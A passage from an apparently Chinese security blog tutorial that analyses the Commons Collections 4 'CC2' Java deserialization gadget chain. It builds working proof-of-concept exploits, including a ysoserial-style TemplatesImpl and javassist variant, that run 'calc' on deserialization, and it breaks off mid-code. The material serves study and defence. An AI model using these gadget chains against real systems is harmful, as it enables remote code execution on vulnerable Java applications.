title="逆推调用链"></a>逆推调用链</h2><p>分析CC1链的时候知道目的是调用<code>InvokerTransformer.transform()</code>方法，CC2链的后半段利用链跟CC1链相同，那就从不同的地方接着分析。<br>在搜寻<code>InvokerTransformer.transform()</code>方法的时候，CC2链中<code>TransformingComparator.compare()</code>方法对其进行了调用。<br><img src="/posts/7e30cd4a/cc2-5.png" title="TransformingComparator.compare()"></p><p>但该方法在cc1链中也调用了为啥不行，因为在<code>Commons Collections4</code>版本中<code>TransformingComparator</code>类实现了序列化接口，而CC1链中依赖<code>Commons Collections3</code>版本，3版本中<code>TransformingComparator</code>类未实现序列化接口，因此入口不成立。</p><p><code>Commons Collections4</code>版本中<code>TransformingComparator</code>类实现了序列化接口。</p><p><img src="/posts/7e30cd4a/cc2-6.png" title="实现了序列化接口"></p><p>其中由构造函数传入<code>transformer</code>对象可控</p><p><img src="/posts/7e30cd4a/cc2-7.png" title="构造函数传入"></p><p>简单实现demo:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//调用TransformingComparator执行compare方法。</span></span><br><span class="line">        TransformingComparator cp=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//随便传入2个参数比较，只为调用.transform()方法</span></span><br><span class="line">        cp.compare(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-8.png" title="实现demo"></p><p>接下来看在哪调用了<code>compare()</code>方法<br>有很多类都进行了调用，其中cc2链中的调用为<code>PriorityQueue</code>类</p><p><img src="/posts/7e30cd4a/cc2-9.png" title="调用情况"></p><p><code>PriorityQueue</code>类中<code>siftUpUsingComparator</code>、<code>siftDownUsingComparator</code>两个方法都进行了调用，再分别查看这两个方法在哪进行了调用。</p><p><strong>siftUpUsingComparator：</strong><br>先是在同类的<code>siftUp</code>方法中进行了调用</p><p><img src="/posts/7e30cd4a/cc2-10.png" title="siftUp"></p><p><code>offer</code>、<code>removeAt</code>这两个方法调用了</p><p><img src="/posts/7e30cd4a/cc2-11.png" title="siftUp"></p><p>追溯调用<code>offer</code>、<code>removeAt</code>者两个方法，发现这两个方法被调用的情况有很多，直观上也没有找到对应的入口，就先看另外一个方法</p><p><img src="/posts/7e30cd4a/cc2-12.png" title="removeAt"></p><p><strong>siftDownUsingComparator：</strong><br><code>siftDownUsingComparator</code>方法在<code>siftDown</code>方法中被调用</p><p><img src="/posts/7e30cd4a/cc2-16.png" title="siftDown"></p><p>继续向上，<code>siftDown</code>方法有三个方法进行了调用，其中<code>heapify</code>方法在反序列化<code>readObject</code>方法中调用</p><p><img src="/posts/7e30cd4a/cc2-17.png" title="siftDown"><br><img src="/posts/7e30cd4a/cc2-18.png" title="heapify"></p><h2 id="正向分析调用链"><a href="#正向分析调用链" class="headerlink" title="正向分析调用链"></a>正向分析调用链</h2><p>找到了反序列化入口，开始分析下调用情况</p><p><img src="/posts/7e30cd4a/cc2-19.png" title="readObject"></p><p>通过注释也不难明白，通过for循环读取序列化数据存在队列中，最后进行堆排序<code>heapify()</code><br>堆排列中通过循环数组长度（size），获取每个元素并执行<code>siftDown</code>方法，其中的长度验证可以调试查看是否为数组长度</p><p><img src="/posts/7e30cd4a/cc2-20.png" title="size验证"><br><img src="/posts/7e30cd4a/cc2-21.png" title="size验证"></p><p>为数组长度接下来进行堆排序<code>heapify()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中来理解<code>size &gt;&gt;&gt; 1</code>, <code>&gt;&gt;&gt;</code>为无符号右移，将size的值转换成二进制并将二进制数值整体向右移动<code>&gt;&gt;&gt;</code>后面数字的位数<br>比如这里size为3，二进制为<font color="red">0000…0000 0011</font> (整数类型有32位的长度，为了方便省略中间重复的0)，<code>&gt;&gt;&gt; 1</code>无符号右移1位<br>对应的二进制为<font color="red">0000…0000 0001</font>，即10进制为1。此时size大小为1。</p><p>所以当size小于2时，for循环中i的值就为<code>0-1=-1</code>，直接跳出循环，不会执行<code>siftDown</code>方法，设计意义也是为了有2个及以上的队列元素才进行排序操作。<br>因此满足此条件，必须给queue队列添加2个及以上元素，才能执行<code>siftDown</code>方法。</p><p>接下来到<code>siftDown</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先会判断是否存在<code>comparator</code>比较器，比较器存在就调用<code>siftDownUsingComparator</code>方法，不存在比较器就调用<code>siftDownComparable</code>方法，按逆推调用链的话就必须存在比较器，才能去调用<code>siftDownUsingComparator</code>方法<br>最后在<code>siftDownUsingComparator</code>方法中调用比较器的<code>compare</code>方法</p><p><img src="/posts/7e30cd4a/cc2-22.png" title="compare方法"></p><p>其中针对<code>PriorityQueue</code>类中的各个方法源码含义<br>可查看相关方法注解：<a href="https://www.cnblogs.com/freeorange/p/11405227.html">https://www.cnblogs.com/freeorange/p/11405227.html</a></p><h2 id="完整利用链"><a href="#完整利用链" class="headerlink" title="完整利用链"></a>完整利用链</h2><p>在cc1后半段基础上补充cc2的利用链，就形成完整利用链</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  -PriorityQueue.readObject()</span><br><span class="line">    -PriorityQueue.heapify()</span><br><span class="line">      -PriorityQueue.siftDown()</span><br><span class="line">        -PriorityQueue.siftDownUsingComparator()</span><br><span class="line">          -TransformingComparator.compare()</span><br><span class="line">            -ChainedTransformer.transform()</span><br><span class="line">              -ConstantTransformer.transform()</span><br><span class="line">              -InvokerTransformer.transform()</span><br><span class="line">                -Method.invoke()</span><br><span class="line">                  -Class.getMethod()</span><br><span class="line">              -InvokerTransformer.transform()</span><br><span class="line">                -Method.invoke()</span><br><span class="line">                  -Runtime.getRuntime()</span><br><span class="line">              -InvokerTransformer.transform()</span><br><span class="line">                -Method.invoke()</span><br><span class="line">                  -Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h2><p>利用链后半段用的cc1的后半段，可直接拿过来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>然后创建比较器，为了调用<code>TransformingComparator</code>的<code>comare</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TransformingComparator cp=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br></pre></td></tr></table></figure><p>比较器创建好了，再创建PriorityQueue队列，引入上面的<code>TransformingComparator</code>比较器，这里有两种利用方式</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方法一：直接new PriorityQueue对象时候添加构造器</span></span><br><span class="line">PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,cp);</span><br><span class="line"></span><br><span class="line"><span class="comment">//方式二：通过反射设置比较器执行</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(pq,cp);</span><br></pre></td></tr></table></figure><p>然后给<code>PriorityQueue</code>队列添加元素，分析过程的时候提到队列数组size大小必须大于等于2，所以这里添加元素最少要添加2个，才能触发利用链的方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">pq.add(<span class="number">1</span>);</span><br><span class="line">pq.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>最后序列化<code>PriorityQueue</code>对象，再反序列化触发漏洞。</p><p>最后POC:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        TransformingComparator cp=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法一：直接new PriorityQueue对象时候添加构造器，该方法调试会抛出异常</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,cp);</span><br><span class="line">        pq.add(<span class="number">1</span>);</span><br><span class="line">        pq.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式二：通过反射设置比较器执行</span></span><br><span class="line">        <span class="comment">//PriorityQueue pq=new PriorityQueue(2);</span></span><br><span class="line">        <span class="comment">//pq.add(1);</span></span><br><span class="line">        <span class="comment">//pq.add(2);</span></span><br><span class="line">        <span class="comment">//Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);</span></span><br><span class="line">        <span class="comment">//field.setAccessible(true);</span></span><br><span class="line">        <span class="comment">//field.set(pq,cp);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//序列化PriorityQueue对象</span></span><br><span class="line">            ObjectOutputStream out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">            out.writeObject(pq);</span><br><span class="line">            <span class="comment">//反序列化触发漏洞</span></span><br><span class="line">            ObjectInputStream os=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">            os.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>执行实现</p><p><img src="/posts/7e30cd4a/cc2-23.png" title="POC执行"></p><p>运行报错原因：</p><p>这里提示有报错，原因是添加的元素无法通过指定的比较器进行比较，从而抛出的异常（添加的元素为数字，比较器为ChainedTransformer对象，两者没有关联关系，自然无法通过该比较器对数值进行比较），但利用链能全部调用，达到执行的效果。</p><p>调试报错原因：</p><p>在调试过程中发现，第一种方式无法进行反序列化步骤的调试，调试会直接抛出异常，因为在声明PriorityQueue对象时先传递入比较器，在添加元素时，会自动引入比较器进行比较，因为无法比较，所以编译文件时直接抛出异常，无法进行调试。<br>而第二种是先声明PriorityQueue对象，添加元素 再通过反射去调用设置比较器，因此可以调试到反序列化的步骤，到最后再进行比较的时候出错再抛出异常。<br>（引用反射的知识，动态调用在用到该反射的时候出错才会抛出异常，而普通用法会在编译的时候会直接调用出错就抛出异常）</p><h1 id="0x05、CC2-yso利用链分析"><a href="#0x05、CC2-yso利用链分析" class="headerlink" title="0x05、CC2-yso利用链分析"></a>0x05、CC2-yso利用链分析</h1><h2 id="分析简述"><a href="#分析简述" class="headerlink" title="分析简述"></a>分析简述</h2><p>在yso利用链中，并没有使用上文cc2链分析的方法，加入了<code>javassist</code>和<code>TemplatesImpl</code>，通过<code>javassist</code>生成恶意字节码，再通过<code>TemplatesImpl</code>加载字节码返回类对象并实例化，通过上文基础知识对<strong>TemplatesImpl</strong>的了解，重点就在找到一个方法可以调用<code>getOutputProperties()</code>或者<code>newTransformer()</code>方法，去执行恶意代码。</p><p>到这也只有正向分析poc来查找调用关系</p><p>yso链的主要利用就是通过PriorityQueue优先级队列设置比较器，将InvokerTransformer(String methodName)方法作为比较器传递入PriorityQueue队列，其中在InvokerTransformer(String methodName)构造函数中传递newTransformer()方法作为参数。</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>主体部分，javassist生成字节码，然后<code>TemplatesImpl</code>填充对应满足条件，可以直接先把上文中<code>TemplatesImpl</code>基础知识的实现demo搬过来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>下一步，主体构造有了，但是需要有入口能调用<code>TemplatesImpl</code>对象的<code>newTransformer()</code>方法</p><p>通过<code>InvokerTransformer(String methodName)</code>方法调用<code>newTransformer()</code>方法或者<code>getOutputProperties()</code>方法都行</p><p><img src="/posts/7e30cd4a/cc2-36.png" title="InvokerTransformer"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">        Constructor cons=Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        <span class="comment">//突破限制，强制调用</span></span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名</span></span><br><span class="line">        InvokerTransformer invokerTransformer=(InvokerTransformer) cons.newInstance(<span class="string">&quot;getOutputProperties&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>getOutputProperties()</code>方法名传递进<code>invokerTransformer</code>对象了，接下来就是跟CC2链分析的调用情况一样，设置比较器，将<code>invokerTransformer</code>作为比较器赋值给<code>TransformingComparator</code>对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置比较器，目的调用compare方法,再通过,执行getOutputProperties方法</span></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br></pre></td></tr></table></figure><p>比较器有了，现在创建PriorityQueue队列，通过反射设置size大小以及比较器，由CC2分析的时候知道调用compare方法是关键，因为跟上文的cc2调用情况不一样，上文调用了<code>ChainedTransformer</code>类把恶意代码执行串起来了，因此队列add进去的参数无所谓</p><p>但这个cc2-yso调用是先设置<code>InvokerTransformer(String methodName)</code>构造函数传递入<code>getOutputProperties</code>方法，最后再通过compare传递入TemplatesImpl对象来调用，相当于执行<code>InvokerTransformer.transform(TemplatesImpl)</code>，最后执行效果为<code>TemplatesImpl.getOutputProperties()</code>达到目的</p><p><img src="/posts/7e30cd4a/cc2-37.png" title="compare"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置比较器，目的调用compare方法去执行invokerTransformer.transform(),执行getOutputProperties方法</span></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        <span class="comment">//设置优先级队列对象</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置比较器</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line">        <span class="comment">//设置传递的队列元素</span></span><br><span class="line">        Object[] list=<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">//向PriorityQueue队列添加元素</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;queue&quot;</span>,list);</span><br></pre></td></tr></table></figure><p>结合以上得到最后的poc：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">        Constructor cons=Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        <span class="comment">//突破限制，强制调用</span></span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名，也可以为newTransformer方法名</span></span><br><span class="line">        InvokerTransformer invokerTransformer=(InvokerTransformer) cons.newInstance(<span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置比较器，目的调用compare方法去执行invokerTransformer.transform(),执行getOutputProperties方法</span></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        <span class="comment">//设置优先级队列对象</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置比较器</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line">        <span class="comment">//设置传递的队列元素，需要将templates对象传入，目的调用InvokerTransformer.transform(TemplatesImpl)</span></span><br><span class="line">        Object[] list=<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">//向PriorityQueue队列添加元素</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;queue&quot;</span>,list);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 